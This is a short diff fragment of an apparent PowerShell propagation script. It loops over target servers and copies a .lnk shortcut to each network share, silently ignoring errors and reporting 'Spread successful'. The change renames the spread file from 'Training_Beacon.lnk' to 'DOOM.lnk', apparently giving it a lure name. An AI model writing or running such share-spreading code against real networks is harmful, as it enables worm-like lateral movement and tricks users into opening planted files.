@@ -37,7 +37,7 @@ foreach ($server in $targets) {
             
             # 3. Attempt to spread the .lnk file
             try {
-                Copy-Item -Path "$home\Desktop\Training_Beacon.lnk" -Destination "$sharePath\" -ErrorAction SilentlyContinue
+                Copy-Item -Path "$home\Desktop\DOOM.lnk" -Destination "$sharePath\" -ErrorAction SilentlyContinue
                 Write-Host "  [+] Spread successful to $sharePath" -ForegroundColor Magenta
             } catch { }
         }
